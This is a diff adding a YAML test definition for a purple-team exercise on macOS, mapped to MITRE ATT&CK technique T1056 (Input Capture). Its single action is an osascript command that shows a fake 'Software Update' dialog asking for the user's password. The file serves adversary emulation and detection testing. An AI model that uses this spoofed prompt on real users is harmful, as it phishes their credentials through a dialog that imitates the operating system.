@@ -1,0 +1,20 @@
+enabled: true
+meta:
+  author: cg
+  created: 2017-10-03
+  decorations:
+  - Purple Team
+  description: osascript for input capture.
+  link: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+  mitre_link: https://attack.mitre.org/wiki/Technique/T1056
+  mitre_attack_phase: Collection
+  mitre_attack_technique: Input Capture
+  purple_actions:
+    1: osascript -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to activate\' -e \'tell app \"System Preferences\" to display dialog \"Software Update PURPLE requires that you type your password to apply changes.\" \& return \& return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"\'
+os: osx
+name: osascript for input capture
+uuid: 7f644ca4-2ffe-43fc-962d-f899d6a98eae
+
+
+
+
